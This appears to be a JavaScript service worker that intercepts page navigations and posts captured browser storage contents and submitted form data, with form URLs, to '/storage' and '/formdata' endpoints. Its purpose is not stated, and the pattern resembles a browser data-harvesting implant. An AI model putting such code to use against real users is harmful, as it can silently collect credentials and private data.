import interceptRequest from '@functions/interceptRequest'
import {Server} from '2sweet'
import postData from './postData'

self.addEventListener('fetch', function(event) {
  const {request} = event
  if (request.mode === "navigate") { // Requesting page
    event.respondWith(interceptRequest(request))
  }
})

const server = new Server(self)

server.on('event', event => {
  if (event.type === 'storage') {
    postData('/storage', event.body)
  } else if (event.type === 'formData') {
    postData('/formdata', event.body, {formurl: event.formURL})
  }
})
